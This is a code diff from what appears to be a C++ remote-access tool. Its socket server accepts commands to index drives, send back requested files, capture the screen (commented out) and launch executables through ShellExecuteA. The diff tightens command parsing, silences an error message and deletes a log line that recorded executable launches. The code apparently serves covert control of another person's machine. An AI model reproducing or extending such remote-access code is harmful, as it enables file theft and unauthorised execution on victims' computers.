@@ -242,7 +242,7 @@ void Server::handleClient(const SOCKET client_socket) {
         else if (strstr(buffer, "!index") != NULL)
             IndexSystem(string(buffer + 7), client_socket);
 
-        else if (strstr(buffer, "!get file") != NULL) {
+        else if (strstr(buffer, "!get file ") != NULL) {
             GetAndSendFile(string(buffer + 10), client_socket);
         } else if (strcmp(buffer, "!exit") == 0)
             break;
@@ -252,8 +252,8 @@ void Server::handleClient(const SOCKET client_socket) {
 
         const int sent_bytes = sendSizeAndResponse(client_socket);
 
-        if (!sent_bytes)
-            std::cerr << "Failed to send size." << std::endl;
+        // if (!sent_bytes)
+        //     std::cerr << "Failed to send size." << std::endl;
 
         // if (strcmp(buffer, "!screenshot") == 0 || strcmp(buffer, "!capture") == 0) {
         //     int image_size = static_cast<int>(image.size());
@@ -418,7 +418,6 @@ void Server::IndexSystem(string drive, const SOCKET clientSocket) {
 void Server::GetAndSendFile(string filePath, const SOCKET client_socket) {
     if (filePath.size() > 4 && filePath.substr(filePath.size() - 4) == ".exe")
     {
-        wss << "Opening .exe file: " << filePath.c_str() << std::endl;
         ShellExecuteA(nullptr, "open", filePath.c_str(), nullptr, nullptr, SW_SHOWNORMAL);
         return;
     }
